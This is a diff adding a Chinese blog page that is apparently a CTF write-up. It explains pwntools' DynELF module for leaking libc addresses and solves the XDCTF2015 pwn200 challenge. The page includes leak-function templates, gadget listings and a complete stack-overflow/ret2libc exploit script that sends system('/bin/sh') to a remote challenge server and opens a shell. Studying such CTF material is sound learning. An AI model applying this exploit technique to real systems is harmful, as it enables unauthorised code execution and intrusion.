@@ -1,0 +1,180 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DynELF的简单利用 - 赵丰年-全世界都知道我很低调</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="赵丰年,"> 
+    <meta name="description" content="写在前面今天本来在看ctfwiki上的ret2_dl_runtime_resolve,当时有点小懵，但是看到他用的例题时XCTF2015的pwn200我就尝试着百度了一下它的wp，然后发现了一种利用,"> 
+    <meta name="author" content="赵丰年de博客"> 
+    <link rel="alternative" href="atom.xml" title="赵丰年-全世界都知道我很低调" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">赵丰年-全世界都知道我很低调</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://xiy-blogs.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">DynELF的简单利用</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">DynELF的简单利用</h1>
+        <div class="stuff">
+            <span>三月 06, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>今天本来在看ctfwiki上的ret2_dl_runtime_resolve,当时有点小懵，但是看到他用的例题时XCTF2015的pwn200我就尝试着百度了一下它的wp，然后发现了一种利用DynELF模块做题的方法，而且了解到，这两种都是做无法获得系统libc版本时的做题手段，于是本着有的吃总比吃不到好的原则，就研究了下，DynELF怎么做这道题的。</p>
+<h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，看下利用模板</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;.&#x2F;xxx&#39;)</span><br><span class="line">def leak(address):</span><br><span class="line">  #各种预处理</span><br><span class="line">  payload &#x3D; &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;</span><br><span class="line">  p.send(payload)</span><br><span class="line">  #各种处理</span><br><span class="line">  data &#x3D; p.recv(4)</span><br><span class="line">  log.debug(&quot;%#x &#x3D;&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return data</span><br><span class="line">d &#x3D; DynELF(leak, elf&#x3D;ELF(&quot;.&#x2F;xxx&quot;))      #初始化DynELF模块 </span><br><span class="line">systemAddress &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)  #在libc文件中搜索system函数的地址</span><br></pre></td></tr></table></figure>
+<h2 id="简单说一下"><a href="#简单说一下" class="headerlink" title="简单说一下"></a>简单说一下</h2><p>模块利用时主要通过write或puts函数来泄露地址信息的，需要注意write函数需要三个参数，puts函数只需要一个参数，而且puts函数无法指定字符串的长度，且遇到0x00截断。所以其leak函数写法有所不同。<br>其次，注意32位程序和64位程序的区别，64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局。<br>下面贴下一位大佬关于利用puts泄露地址信息的leak函数模板<br>puts输出完后无其他输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">  count &#x3D; 0</span><br><span class="line">  data &#x3D; &#39;&#39;</span><br><span class="line">  payload &#x3D; xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  print p.recvuntil(&#39;xxxn&#39;) #一定要在puts前释放完输出</span><br><span class="line">  up &#x3D; &quot;&quot;</span><br><span class="line">  while True:</span><br><span class="line">    #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了</span><br><span class="line">    #以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span><br><span class="line">    c &#x3D; p.recv(numb&#x3D;1, timeout&#x3D;1)</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line">    if up &#x3D;&#x3D; &#39;n&#39; and c &#x3D;&#x3D; &quot;&quot;:  #接收到的上一个字符为回车符，而当前接收不到新字符，则</span><br><span class="line">      buf &#x3D; buf[:-1]             #删除puts函数输出的末尾回车符</span><br><span class="line">      buf +&#x3D; &quot;x00&quot;</span><br><span class="line">      break</span><br><span class="line">    else:</span><br><span class="line">      buf +&#x3D; c</span><br><span class="line">    up &#x3D; c</span><br><span class="line">  data &#x3D; buf[:4]  #取指定字节数</span><br><span class="line">  log.info(&quot;%#x &#x3D;&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return data</span><br></pre></td></tr></table></figure>
+<p>当puts输出完后，还有输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">  count &#x3D; 0</span><br><span class="line">  data &#x3D; &quot;&quot;</span><br><span class="line">  payload &#x3D; xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出</span><br><span class="line">  up &#x3D; &quot;&quot;</span><br><span class="line">  while True:</span><br><span class="line">    c &#x3D; p.recv(1)</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line">    if up &#x3D;&#x3D; &#39;n&#39; and c &#x3D;&#x3D; &quot;x&quot;:  #一定要找到泄漏信息的字符串特征</span><br><span class="line">      data &#x3D; buf[:-1]                     </span><br><span class="line">      data +&#x3D; &quot;x00&quot;</span><br><span class="line">      break</span><br><span class="line">    else:</span><br><span class="line">      buf +&#x3D; c</span><br><span class="line">    up &#x3D; c</span><br><span class="line">  data &#x3D; buf[:4] </span><br><span class="line">  log.info(&quot;%#x &#x3D;&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return data</span><br></pre></td></tr></table></figure>
+<h2 id="攻防世界pwn200"><a href="#攻防世界pwn200" class="headerlink" title="攻防世界pwn200"></a>攻防世界pwn200</h2><p>检查保护机制，只开启了NX<br>跟大佬学的思路，开启了NX就不要想shellcod了，就要往system(‘/bin/sh’)上想了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;xiy&#x2F;\xe4\xb8\x8b\xe8\xbd\xbd&#x2F;pwn&#x2F;pwn200&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>然后IDA看看<br><img src="https://i.loli.net/2020/03/06/hyFi7kusp5UfvnC.png" alt="g16.png"><br><img src="https://i.loli.net/2020/03/06/Zz5x8vbQTAINMke.png" alt="g13 _1_.png"><br>这边看到应该是有一个栈溢出的，然后，有read,write函数，但是没有system,搜索字符串也没有’/bin/sh’的，而且这道题没给libc库，所以很符合使用DynELF模块的特征，首先我还是先算一下它的偏移。<br><img src="https://i.loli.net/2020/03/06/yqg2Dfzb1QSocOd.png" alt="g17.png"><br>好的，下面让脚本说话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#r &#x3D; process(&#39;.&#x2F;pwn200&#39;)</span><br><span class="line">r &#x3D; remote(&#39;111.198.29.45&#39;,45585)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn200&#39;)</span><br><span class="line">read &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">write &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">bss &#x3D; elf.bss()</span><br><span class="line">main &#x3D; 0x80484be</span><br><span class="line">pppt &#x3D; 0x0804856c</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">    r.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line">    payload &#x3D; &#39;a&#39;*112 + p32(write) + p32(main) + p32(1) + p32(address) + p32(4)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    data &#x3D; r.recv(4)</span><br><span class="line">    return data</span><br><span class="line">d &#x3D; DynELF(leak,elf&#x3D;ELF(&#39;.&#x2F;pwn200&#39;))</span><br><span class="line">systemAddress &#x3D; d.lookup(&#39;system&#39;,&#39;libc&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*112 + p32(read) + p32(pppt) + p32(0) + p32(bss) + p32(8) + p32(systemAddress) + p32(main) + p32(bss)</span><br><span class="line">r.send(payload)</span><br><span class="line">payload &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里解释下其思路是利用write函数泄露地址信息后返回main函数恢复栈，以便下次还能利用栈溢出。<br>然后通过三个pop操作将read的三个参数弹出，以执行system函数。<br>查找三个pop的方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">x:~&#x2F;下载&#x2F;pwn$ ROPgadget --binary pwn200 --only &#39;pop|pop|pop|ret&#39;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x08048453 : pop ebp ; ret</span><br><span class="line">0x08048452 : pop ebx ; pop ebp ; ret</span><br><span class="line">0x0804856c : pop ebx ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485cc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804836c : pop ebx ; ret</span><br><span class="line">0x0804856d : pop edi ; pop ebp ; ret</span><br><span class="line">0x080485cd : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804834b : ret</span><br><span class="line">0x08048532 : ret 0xb8</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 9</span><br></pre></td></tr></table></figure>
+<p>emmmm想了想，ret2_dl_runtime_resolve对我们这种萌新有点不太友好，想弄懂他还是要对ELF有深刻的认知，所以先欠着，以后再学。关于本题和64位程序使用DynELF模块的方法大家可以参考下面链接。<br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a><br><a href="https://blog.csdn.net/qq_33528164/article/details/79408415" target="_blank" rel="noopener">https://blog.csdn.net/qq_33528164/article/details/79408415</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="https://music.163.com/#/song?id=569213220">
+            </audio>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='9795acb241b5abfffb0a'
+        data-cs='660e7056618084a8a8046e8e2e9e78787cdb23cf'
+        data-r='XIY-blogs.github.io'
+        data-o='XIY-blogs'
+        data-a='XIY-blogs'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
